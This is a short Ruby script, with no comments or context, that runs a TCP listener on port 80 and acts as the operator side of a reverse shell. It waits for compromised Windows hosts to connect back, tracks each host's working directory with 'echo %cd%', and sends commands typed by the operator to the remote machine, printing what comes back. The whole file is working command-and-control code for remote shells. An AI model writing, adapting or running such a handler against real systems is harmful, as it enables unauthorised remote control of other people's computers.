require 'socket'

server = TCPServer.new('0.0.0.0', 80)
puts "Server Started"

loop do
  client = server.accept
  puts "Client connected #{client.peeraddr}"

  client.puts 'echo %cd%'
  cwd = client.gets.chomp

  Thread.new do
    loop do
      print "#{cwd}> "
      cmd = gets.chomp
      break if cmd == "exit"

      client.puts cmd
      response = client.recv(4096)
      puts "#{response}"

      client.puts 'echo %cd%'
      cwd = client.gets.chomp
    end

    client.close
    puts "Client disconnected"
  end
end